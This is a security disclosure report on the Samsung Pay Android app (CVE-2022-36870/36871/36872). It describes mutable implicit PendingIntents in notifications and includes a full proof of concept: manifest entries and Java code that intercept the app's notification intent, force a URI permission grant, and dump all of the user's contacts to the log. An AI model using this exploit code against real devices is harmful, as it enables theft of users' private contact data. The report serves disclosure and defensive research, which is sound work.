# Details

<table>
    <tr>
        <td>Name</td>
        <td>Samsung Pay</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.samsung.android.spay</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.04.19</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.09.07</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-36870">CVE-2022-36870</a>, <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-36871">CVE-2022-36871</a>, <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-36872">CVE-2022-36872</a> (SVE-2022-0973)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$6340</td>
    </tr>
</table>

# Description

Oversecured report:
![](Oversecured_report.png)

Oversecured found multiple uses of implicit intents to create `PendingIntent` objects for notifications without using the `PendingIntent.FLAG_IMMUTABLE` flag. The attacker's app, if it had access to app notifications, could intercept them and redirect them to its activity, before making it grant content providers access permissions with the `android:grantUriPermissions="true"` flag, if the app was running on devices running Android SDK 24-30.

**Proof of Concept**

This code will force the Samsung Pay app to grant permissions to access all of the user's contacts.

File `AndroidManifest.xml`:
```xml
<service android:name=".NotificationListener" android:label="PoC" android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" android:exported="true">
    <intent-filter>
        <action android:name="android.service.notification.NotificationListenerService" />
    </intent-filter>
</service>
```
```xml
<activity android:name=".InterceptActivity" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="smth" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```

File `NotificationListener.java`:
```java
private static final String APP = "com.samsung.android.spay";

@Override
public void onNotificationPosted(StatusBarNotification sbn, NotificationListenerService.RankingMap rankingMap) {
    if (!APP.equals(sbn.getPackageName())) {
        return;
    }
    PendingIntent contentIntent = sbn.getNotification().contentIntent;
    if (contentIntent == null) {
        return;
    }
    try {
        Intent fillin = new Intent();
        fillin.setPackage(getPackageName());
        fillin.addCategory("smth");
        fillin.setClipData(getClipData());
        fillin.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION
                | Intent.FLAG_GRANT_WRITE_URI_PERMISSION
                | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
                | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION);
        contentIntent.send(this, 0, fillin);
    } catch (Throwable th) {
        throw new RuntimeException(th);
    }
}

private ClipData getClipData() {
    return ClipData.newRawUri("", ContactsContract.CommonDataKinds.Phone.CONTENT_URI);
}
```

File `InterceptActivity.java`:
```java
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    dump(getIntent().getClipData().getItemAt(0).getUri());
}

public void dump(Uri uri) {
    Cursor cursor = getContentResolver().query(uri, null, null, null, null);
    if (cursor.moveToFirst()) {
        do {
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < cursor.getColumnCount(); i++) {
                if (sb.length() > 0) {
                    sb.append(", ");
                }
                sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
            }
            Log.d("evil", sb.toString());
        } while (cursor.moveToNext());
    }
}
```

As a result, when the app displays this notification, the attacking app will automatically forward the `PendingIntent` to `InterceptActivity`.

## References

- [Oversecured Blog. Gaining access to arbitrary* Content Providers](https://blog.oversecured.com/Gaining-access-to-arbitrary-Content-Providers/)
